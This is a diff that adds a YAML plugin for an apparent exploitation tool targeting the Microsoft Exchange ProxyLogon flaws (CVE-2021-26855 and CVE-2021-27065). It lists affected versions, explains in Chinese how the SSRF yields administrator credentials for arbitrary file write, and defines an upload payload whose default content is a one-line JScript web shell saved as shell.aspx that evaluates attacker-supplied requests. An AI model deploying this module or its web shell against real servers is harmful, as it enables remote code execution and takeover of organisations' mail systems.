@@ -1,0 +1,47 @@
+info:
+    app: exchange
+    name: Proxylogon
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2021-03-03"
+    create_date: "2024-10-06 07:01:35"
+    update_date: "2024-10-06 07:01:35"
+    scope: |-
+        Microsoft Exchange 2013 < CU24
+        Microsoft Exchange 2016 < CU20
+        Microsoft Exchange 2019 < CU9
+        Microsoft Exchange 2010 < SP4
+        Exchange 2013 Versions < 15.00.1497.012
+        Exchange 2016 CU18 < 15.01.2106.013
+        Exchange 2016 CU19 < 15.01.2176.009
+        Exchange 2019 CU7 < 15.02.0721.013
+        Exchange 2019 CU8 < 15.02.0792.010
+    description: 攻击者可以通过CVE-2021-26855的ssrf漏洞获取到的Exchange administrator凭证，通过CVE-2021-27065构造恶意请求，在系统上写入任意文件。
+    vul_id: CVE-2021-26855/CVE-2021-27065
+    detail: |-
+        获取信息：
+        	验证漏洞并获取版本信息
+        漏洞利用：
+        	1. webshell只能使用和一句话木马差不多长度的，太长无法写入。
+        	2. 填写一个目标存在的邮箱账号，点击上传即可。
+payloads:
+    - name: getmsg
+      alias: 获取信息
+    - name: upload
+      alias: 文件上传
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: shell.aspx
+            required: true
+          - key: content
+            title: 内容
+            param_type: textarea
+            default_value: <script language="JScript" runat="server"> function Page_Load(){eval(Request["data"],"unsafe");}</script>
+            required: true
+          - key: email
+            title: 邮箱
+            param_type: edit
+            default_value: administrator@test.com
+            required: true
